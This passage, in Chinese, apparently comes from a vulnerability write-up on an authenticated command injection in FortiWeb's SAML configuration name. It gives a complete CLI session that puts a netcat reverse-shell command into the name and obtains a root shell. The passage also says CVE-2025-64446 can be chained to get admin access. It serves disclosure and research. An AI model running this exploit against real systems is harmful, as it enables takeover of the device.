
虽然 SAML 配置的几个组件都经过清理，以去除与命令注入相关的错误字符，但配置名称（在上述反编译中指向的名称`v2->char0`）并未经过清理。

从文档中我们可以了解到，要编辑 SAML 配置，用户需要以下权限：您的管理员帐户的访问控制配置文件必须对`authusergrp`区域具有`w`或`rw`权限。此外，从文档中我们可以看到，以下 CLI 命令序列允许创建一个新的 SAML 配置：

```
config user saml-user
    edit ""
        set entityID ""
        set service-path ""
        set enforce-signing {enable | disable}
        set slo-bind {post | redirect}
        set slo-path ""
        set sso-bind 
        set sso-path ""
        config mapping-domains
            edit 
            set domain 
        next
        end
    next
end
```

因此，只需以已登录管理员身份在 CLI 上进行实验（请记住，我们可以通过 CVE-2025-64446 创建一个新的本地管理员），我们就可以成功触发经过身份验证的命令注入漏洞，并以 root 权限执行 netcat 反向 shell：

```
FortiWeb # config user saml-user
FortiWeb (saml-user) # edit "`nc 192.168.86.35 4444 -e /bin/bash`"
FortiWeb (`nc 192.168.86~3) # set entityID http://foo
FortiWeb (`nc 192.168.86~3) # set service-path /foo
FortiWeb (`nc 192.168.86~3) # set enforce-signing disable
FortiWeb (`nc 192.168.86~3) # set slo-bind post
FortiWeb (`nc 192.168.86~3) # set slo-path /foo
FortiWeb (`nc 192.168.86~3) # set sso-bind post
FortiWeb (`nc 192.168.86~3) # set sso-path /foo
FortiWeb (`nc 192.168.86~3) # end
```

当创建此新配置时（通过上面的最后一个命令 `end`），命令注入漏洞被触发，恶意 SAML 配置名称（在我们上面的示例中）通过函数 `systemoper_user_saml_part_0` 中的调用 `nc 192.168.86.35 4444 -e /bin/bash` 执行。结果是在目标 FortiWeb 设备（8.0.1，以下示例中的版本）上获得了远程 root shell。
